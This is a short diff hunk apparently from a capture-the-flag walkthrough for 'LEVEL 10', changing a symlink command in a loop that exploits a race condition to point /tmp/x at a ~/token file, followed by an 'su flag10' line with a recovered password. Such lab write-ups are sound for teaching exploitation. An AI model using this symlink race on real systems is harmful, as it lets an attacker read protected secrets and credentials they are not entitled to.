@@ -126,7 +126,7 @@ LEVEL 10
             rm -rf /tmp/x
             touch /tmp/x
             # Race condition here
-            ln -s ~/token /tmp/x
+            ln -sf ~/token /tmp/x
         done
 
     su flag10 woupa2yuojeeaaed06riuj63c
